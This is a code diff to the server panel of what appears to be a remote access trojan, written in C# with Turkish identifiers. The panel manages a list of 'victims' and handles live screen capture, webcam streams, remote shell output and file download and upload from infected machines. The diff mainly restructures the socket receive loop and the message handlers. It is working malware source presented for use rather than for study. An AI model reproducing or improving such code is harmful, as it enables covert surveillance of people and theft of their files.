@@ -137,7 +137,7 @@ namespace SV
                 }
                 new System.Threading.Thread(new System.Threading.ThreadStart(() =>
                 {
-                    ClientSession inf = new ClientSession(sock, this);
+                    ClientSession inf = new ClientSession(sock, this);                    
                     receiveClasses.Add(sock.Handle.ToString(), inf);
                 }))
                 { IsBackground = true }.Start();
@@ -162,32 +162,29 @@ namespace SV
                 frm1.listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + _client.Handle.ToString() +
                         " socket session has started.");
 
-                ReadAsync(_client);
+                Read(_client);
             }
 
-            private async void ReadAsync(Socket client)
+            private async void Read(Socket client)
             {
-                using (NetworkStream ns = new NetworkStream(client))
+                int readed = default;
+                while (true)
                 {
-                    int readed = default;
-                    while (true)
+                    try
                     {
-                        try
+                        readed = client.Receive(dataByte, 0, blockSize, SocketFlags.None);
+                        if (readed > 0)
                         {
-                            readed = await ns.ReadAsync(dataByte, 0, blockSize);
-                            if (readed > 0)
+                            if (memos != null)
                             {
-                                if (memos != null)
-                                {
-                                    memos.Write(dataByte, 0, readed);
-                                    UnPacker(client, memos);
-                                }
-
+                                memos.Write(dataByte, 0, readed);
+                                UnPacker(client, memos);
                             }
+
                         }
-                        catch (Exception) { break; }
-                        await Task.Delay(1);
                     }
+                    catch (Exception) { break; }
+                    await Task.Delay(1);
                 }
             }
             private void UnPacker(Socket sck, MemoryStream ms)
@@ -553,7 +550,7 @@ namespace SV
                                 shelll.WindowState = FormWindowState.Maximized;
                                 shelll.Show();
                             });
-                        }                      
+                        }
                         shelll.bilgileriIsle(Encoding.UTF8.GetString(dataBuff));
                         break;
                     case "<PONG>":
@@ -593,74 +590,70 @@ namespace SV
                         });
                         break;
                     case "<MYSCREENREADY>":
-                        if (receiveClasses.ContainsKey(soket2.Handle.ToString()))
+                        var krbn_sc = kurban_listesi.Where(x => x.identify == tag.Split('|')[2].Replace(">", "")).FirstOrDefault();
+                        if (krbn_sc != null)
                         {
-                            var krbn_ = kurban_listesi.Where(x => x.identify == tag.Split('|')[2].Replace(">", "")).FirstOrDefault();
-                            if (krbn_ != null)
+                            var canliekran = FindLiveScreenById(krbn_sc.id);
+                            if (canliekran != null)
                             {
-                                var canliekran = FindLiveScreenById(krbn_.id);
-                                if (canliekran != null)
+                                canliekran.infoAl = infClass;
+                                listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + krbnIsminiBul(krbn_sc.id) + " - live screen ready.");
+                            }
+                            else
+                            {
+                                listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + krbnIsminiBul(krbn_sc.id) + " - null screen window.");
+                                try
                                 {
-                                    canliekran.infoAl = infClass;
-                                    listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + krbnIsminiBul(krbn_.id) + " - live screen ready.");
+                                    byte[] senddata = MyDataPacker("SCREENLIVECLOSE", Encoding.UTF8.GetBytes("ECHO"));
+                                    krbn_sc.soket.Send(senddata, 0, senddata.Length, SocketFlags.None);
+                                }
+                                catch (Exception) { }
+                                infClass.CloseSocks();
+                            }
+                        }
+                        else
+                        {
+                            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + krbnIsminiBul(krbn_sc.id) + " - victim not found.");
+                            infClass.CloseSocks();
+                        }
+                        break;
+                    case "<MYVIDREADY>":
+                        var krbn_ = kurban_listesi.Where(x => x.identify == tag.Split('|')[2].Replace(">", "")).FirstOrDefault();
+                        if (krbn_ != null)
+                        {
+                            var shortcam_ = FİndKameraById(krbn_.id);
+                            try
+                            {
+                                if (shortcam_ != null)
+                                {
+                                    shortcam_.infoAl = infClass;
+                                    listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + krbnIsminiBul(krbn_.id) + " - live camera ready.");
                                 }
                                 else
                                 {
+                                    listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + krbnIsminiBul(krbn_.id) + " - null camera window.");
                                     try
                                     {
-                                        byte[] senddata = MyDataPacker("SCREENLIVECLOSE", Encoding.UTF8.GetBytes("ECHO"));
+                                        byte[] senddata = MyDataPacker("LIVESTOP", Encoding.UTF8.GetBytes("ECHO"));
                                         krbn_.soket.Send(senddata, 0, senddata.Length, SocketFlags.None);
                                     }
                                     catch (Exception) { }
                                     infClass.CloseSocks();
                                 }
                             }
-                            else
+                            catch (Exception ex)
                             {
-                                infClass.CloseSocks();
+                                if (shortcam_ != null)
+                                {
+                                    FİndKameraById(krbn_.id).Text = ex.ToString();
+                                }
                             }
                         }
-                        else { infClass.CloseSocks(); }
-                        break;
-                    case "<MYVIDREADY>":
-                        if (receiveClasses.ContainsKey(soket2.Handle.ToString()))
+                        else
                         {
-                            var krbn_ = kurban_listesi.Where(x => x.identify == tag.Split('|')[2].Replace(">", "")).FirstOrDefault();
-                            if (krbn_ != null)
-                            {
-                                var shortcam_ = FİndKameraById(krbn_.id);
-                                try
-                                {
-                                    if (shortcam_ != null)
-                                    {
-                                        shortcam_.infoAl = infClass;
-                                        listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + krbnIsminiBul(krbn_.id) + " - live camera ready.");
-                                    }
-                                    else
-                                    {
-                                        try
-                                        {
-                                            byte[] senddata = MyDataPacker("LIVESTOP", Encoding.UTF8.GetBytes("ECHO"));
-                                            krbn_.soket.Send(senddata, 0, senddata.Length, SocketFlags.None);
-                                        }
-                                        catch (Exception) { }
-                                        infClass.CloseSocks();
-                                    }
-                                }
-                                catch (Exception ex)
-                                {
-                                    if (shortcam_ != null)
-                                    {
-                                        FİndKameraById(krbn_.id).Text = ex.ToString();
-                                    }
-                                }
-                            }
-                            else
-                            {
-                                infClass.CloseSocks();
-                            }
+                            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + krbnIsminiBul(krbn_.id) + " - victim not found.");
+                            infClass.CloseSocks();
                         }
-                        else { infClass.CloseSocks(); }
                         break;
                     case "<MYIP>":
                         Invoke((MethodInvoker)delegate
@@ -757,29 +750,22 @@ namespace SV
                         break;
 
                     case "<VID>":
-                        if (receiveClasses.ContainsKey(soket2.Handle.ToString()))
+                        var krbn = kurban_listesi.Where(x => x.identify == tag.Split('|')[2].Replace(">", "")).FirstOrDefault();
+                        if (krbn != null)
                         {
-                            var krbn = kurban_listesi.Where(x => x.identify == tag.Split('|')[2].Replace(">", "")).FirstOrDefault();
-                            if (krbn != null)
+                            var shortcam = FİndKameraById(krbn.id);
+                            try
                             {
-                                var shortcam = FİndKameraById(krbn.id);
-                                try
+                                if (shortcam != null)
                                 {
-                                    if (shortcam != null)
+                                    if (shortcam.metroButton3.Text == "Stop")
                                     {
-                                        if (shortcam.metroButton3.Text == "Stop")
-                                        {
 
-                                            using (Image im = (Image)new ImageConverter().ConvertFrom(dataBuff))
-                                            {
-                                                shortcam.pictureBox2.Image = shortcam.RotateImage(im);
-                                                shortcam.metroLabel7.Text = "FPS: " + shortcam.CalculateFrameRate().ToString();
-                                                shortcam.metroLabel8.Text = GetFileSizeInBytes(dataBuff.Length);
-                                            }
-                                        }
-                                        else
+                                        using (Image im = (Image)new ImageConverter().ConvertFrom(dataBuff))
                                         {
-                                            infClass.CloseSocks();
+                                            shortcam.pictureBox2.Image = shortcam.RotateImage(im);
+                                            shortcam.metroLabel7.Text = "FPS: " + shortcam.CalculateFrameRate().ToString();
+                                            shortcam.metroLabel8.Text = GetFileSizeInBytes(dataBuff.Length);
                                         }
                                     }
                                     else
@@ -787,20 +773,23 @@ namespace SV
                                         infClass.CloseSocks();
                                     }
                                 }
-                                catch (Exception ex)
+                                else
                                 {
-                                    if (shortcam != null)
-                                    {
-                                        FİndKameraById(krbn.id).Text = ex.ToString();
-                                    }
+                                    infClass.CloseSocks();
                                 }
                             }
-                            else
+                            catch (Exception ex)
                             {
-                                infClass.CloseSocks();
+                                if (shortcam != null)
+                                {
+                                    FİndKameraById(krbn.id).Text = ex.ToString();
+                                }
                             }
                         }
-                        else { infClass.CloseSocks(); }
+                        else
+                        {
+                            infClass.CloseSocks();
+                        }
                         break;
 
                     case "<SHORTCUT>":
@@ -943,32 +932,27 @@ namespace SV
                                     Invoke((MethodInvoker)delegate
                                     {
                                         Yuzde yzdlk = FindYuzdeById(dosyaismi + "|" + path);
-                                        if (receiveClasses.ContainsKey(soket2.Handle.ToString()))
+
+                                        if (yzdlk == null)
                                         {
-                                            if (yzdlk == null)
-                                            {
-                                                yzdlk = new Yuzde(dosyaismi + "|" + path, infClass);
-                                                yzdlk.Text = "Download Progress - " + krbnIsminiBul(victim.id);
-                                                yzdlk.Show();
-                                            }
-                                            yzdlk.fs.Write(dosyaVerisi, 0, dosyaVerisi.Length);
-                                            yzdlk.label2.Text = dosyaismi;
-                                            yzdlk.label3.Text = GetFileSizeInBytes(yzdlk.fs.Length) + "/" + GetFileSizeInBytes(maximum);
-                                            decimal yuzde = yzdlk.fs.Length * 100 / maximum;
-                                            yzdlk.label1.Text = "%" + yuzde.ToString();
-                                            yzdlk.progressBar1.Value = Convert.ToInt32(yuzde);
-                                            if (yzdlk.progressBar1.Value == 100)
-                                            {
-                                                FİleManager fm = FindFileManagerById(victim.id);
-                                                if (fm != null)
-                                                { fm.listBox1.Items.Add(DateTime.Now.ToString("HH:mm:ss") + " - File download completed => " + dosyaismi); }
-                                                yzdlk.Close();
-                                            }
+                                            yzdlk = new Yuzde(dosyaismi + "|" + path, infClass);
+                                            yzdlk.Text = "Download Progress - " + krbnIsminiBul(victim.id);
+                                            yzdlk.Show();
                                         }
-                                        else
+                                        yzdlk.fs.Write(dosyaVerisi, 0, dosyaVerisi.Length);
+                                        yzdlk.label2.Text = dosyaismi;
+                                        yzdlk.label3.Text = GetFileSizeInBytes(yzdlk.fs.Length) + "/" + GetFileSizeInBytes(maximum);
+                                        decimal yuzde = yzdlk.fs.Length * 100 / maximum;
+                                        yzdlk.label1.Text = "%" + yuzde.ToString();
+                                        yzdlk.progressBar1.Value = Convert.ToInt32(yuzde);
+                                        if (yzdlk.progressBar1.Value == 100)
                                         {
-                                            infClass.CloseSocks();
+                                            FİleManager fm = FindFileManagerById(victim.id);
+                                            if (fm != null)
+                                            { fm.listBox1.Items.Add(DateTime.Now.ToString("HH:mm:ss") + " - File download completed => " + dosyaismi); }
+                                            yzdlk.Close();
                                         }
+
                                     });
 
                                 }
@@ -1002,30 +986,25 @@ namespace SV
                             Invoke((MethodInvoker)delegate
                             {
                                 UploadProgress uping = FindUploadProgressById(identifi);
-                                if (receiveClasses.ContainsKey(soket2.Handle.ToString()))
+
+                                if (uping == null)
                                 {
-                                    if (uping == null)
-                                    {
-                                        uping = new UploadProgress(soket2, infClass, pcPath, identifi);
-                                        uping.Text = "Upload Progress - " + krbnIsminiBul(kbn.id);
-                                        uping.Show();
-                                    }
-                                    uping.label1.Text = dAdi;
-                                    uping.progressBar1.Value = int.Parse(yz.Replace("%", ""));
-                                    uping.label3.Text = yz;
-                                    uping.label2.Text = kbMb;
-                                    if (uping.progressBar1.Value == 100)
-                                    {
-                                        FİleManager fm = FindFileManagerById(kbn.id);
-                                        if (fm != null)
-                                        { fm.listBox1.Items.Add(DateTime.Now.ToString("HH:mm:ss") + " - File upload completed => " + dAdi); }
-                                        uping.Close();
-                                    }
+                                    uping = new UploadProgress(soket2, infClass, pcPath, identifi);
+                                    uping.Text = "Upload Progress - " + krbnIsminiBul(kbn.id);
+                                    uping.Show();
                                 }
-                                else
+                                uping.label1.Text = dAdi;
+                                uping.progressBar1.Value = int.Parse(yz.Replace("%", ""));
+                                uping.label3.Text = yz;
+                                uping.label2.Text = kbMb;
+                                if (uping.progressBar1.Value == 100)
                                 {
-                                    infClass.CloseSocks();
+                                    FİleManager fm = FindFileManagerById(kbn.id);
+                                    if (fm != null)
+                                    { fm.listBox1.Items.Add(DateTime.Now.ToString("HH:mm:ss") + " - File upload completed => " + dAdi); }
+                                    uping.Close();
                                 }
+
                             });
                         }
                         else
@@ -1238,49 +1217,45 @@ namespace SV
                         }
                         break;
                     case "<LIVESCREEN>":
-                        if (receiveClasses.ContainsKey(soket2.Handle.ToString()))
+                        var krbn_scc = kurban_listesi.Where(x => x.identify == tag.Split('|')[2].Replace(">", "")).FirstOrDefault();
+                        if (krbn_scc != null)
                         {
-                            var krbn_ = kurban_listesi.Where(x => x.identify == tag.Split('|')[2].Replace(">", "")).FirstOrDefault();
-                            if (krbn_ != null)
+                            var canliekran = FindLiveScreenById(krbn_scc.id);
+                            if (canliekran != null)
                             {
-                                var canliekran = FindLiveScreenById(krbn_.id);
-                                if (canliekran != null)
+                                if (canliekran.button1.Enabled == false)
                                 {
-                                    if (canliekran.button1.Enabled == false)
+                                    using (MemoryStream ms = new MemoryStream(StringCompressor.Decompress(dataBuff)))
                                     {
-                                        using (MemoryStream ms = new MemoryStream(StringCompressor.Decompress(dataBuff)))
+                                        using (Image sourceImg = Image.FromStream(ms))
                                         {
-                                            using (Image sourceImg = Image.FromStream(ms))
+                                            Image clonedImg = new Bitmap(sourceImg.Width, sourceImg.Height, PixelFormat.Format32bppArgb);
+                                            using (var copy = Graphics.FromImage(clonedImg))
                                             {
-                                                Image clonedImg = new Bitmap(sourceImg.Width, sourceImg.Height, PixelFormat.Format32bppArgb);
-                                                using (var copy = Graphics.FromImage(clonedImg))
-                                                {
-                                                    copy.DrawImage(sourceImg, 0, 0);
-                                                }
-                                                canliekran.pictureBox1.InitialImage = null;
-                                                canliekran.pictureBox1.Image = clonedImg;
+                                                copy.DrawImage(sourceImg, 0, 0);
                                             }
+                                            canliekran.pictureBox1.InitialImage = null;
+                                            canliekran.pictureBox1.Image = clonedImg;
                                         }
                                     }
-                                    else { infClass.CloseSocks(); }
                                 }
-                                else
-                                {
-                                    try
-                                    {
-                                        byte[] senddata = MyDataPacker("SCREENLIVECLOSE", Encoding.UTF8.GetBytes("ECHO"));
-                                        krbn_.soket.Send(senddata, 0, senddata.Length, SocketFlags.None);
-                                    }
-                                    catch (Exception) { }
-                                    infClass.CloseSocks();
-                                }
+                                else { infClass.CloseSocks(); }
                             }
                             else
                             {
+                                try
+                                {
+                                    byte[] senddata = MyDataPacker("SCREENLIVECLOSE", Encoding.UTF8.GetBytes("ECHO"));
+                                    krbn_scc.soket.Send(senddata, 0, senddata.Length, SocketFlags.None);
+                                }
+                                catch (Exception) { }
                                 infClass.CloseSocks();
                             }
                         }
-                        else { infClass.CloseSocks(); }
+                        else
+                        {
+                            infClass.CloseSocks();
+                        }
                         break;
 
                     case "<NOTSTART>":
@@ -1904,7 +1879,7 @@ namespace SV
             listBox1.Visible = !listBox1.Visible;
             if (listBox1.Visible) { listBox1.BringToFront(); logsToolStripMenuItem.Text = "Victims"; }
             else { listBox1.SendToBack(); logsToolStripMenuItem.Text = "Logs"; }
-        }      
+        }
         private void toolStripMenuItem2_Click(object sender, EventArgs e)
         {
             if (dataGridView1.SelectedRows.Count == 1)
@@ -1928,7 +1903,7 @@ namespace SV
         {
             soketimiz.Close();
             soketimiz.Dispose();
-            foreach(KeyValuePair<string, ClientSession> p in receiveClasses.ToList())
+            foreach (KeyValuePair<string, ClientSession> p in receiveClasses.ToList())
             {
                 p.Value.CloseSocks();
             }
